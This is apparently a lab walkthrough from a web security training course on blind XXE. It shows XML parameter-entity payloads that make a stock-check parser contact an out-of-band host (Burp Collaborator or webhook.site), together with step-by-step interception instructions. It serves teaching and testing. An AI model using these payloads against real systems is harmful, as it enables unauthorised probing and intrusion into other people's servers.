# Lab: Blind XXE with Out-of-Band Interaction via XML Parameter Entities

## Description

This lab contains a "Check stock" feature that accepts XML input but does not display the result of XML parsing. In addition, requests containing regular external entities are blocked. The objective is to exploit the Blind XXE vulnerability using XML parameter entities and confirm it through out-of-band interactions.

## Vulnerability Overview

The application blocks regular external entities but still allows XML parameter entities within the DTD. By defining an external parameter entity and invoking it inside the DTD, the XML parser can be forced to perform DNS lookups and HTTP requests to an attacker-controlled domain. Monitoring these interactions confirms the presence of a Blind XXE vulnerability.

---

## Method 1: Using Burp Collaborator

### Exploitation Steps

1. Navigate to any product page.
2. Click **Check stock**.
3. Intercept the POST request using Burp Suite Professional.
4. Insert the following DOCTYPE declaration between the XML declaration and the `<stockCheck>` element:

```xml id="9faj8u"
<!DOCTYPE stockCheck [
<!ENTITY % xxe SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN">
%xxe;
]>
```

The modified request becomes:

```xml id="j1m7o9"
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE stockCheck [
<!ENTITY % xxe SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN">
%xxe;
]>
<stockCheck>
    <productId>1</productId>
    <storeId>1</storeId>
</stockCheck>
```

5. Forward the request.
6. Go to the Collaborator tab and click **Poll now**.
7. Observe the DNS and HTTP interactions generated by the application server.



## Method 2: Using Webhook.site (Alternative)

### Exploitation Steps

1. Obtain a unique URL from Webhook.site.
2. Intercept the stock check request.
3. Insert the following payload:

```xml id="lmk6rj"
<!DOCTYPE stockCheck [
<!ENTITY % xxe SYSTEM "https://webhook.site/YOUR-UNIQUE-ID">
%xxe;
]>
```

4. Forward the request.
5. Monitor Webhook.site for incoming requests.

### Result

If parameter entities are processed, the XML parser performs a DNS lookup and HTTP request to the supplied URL. The received interaction confirms the Blind XXE vulnerability.
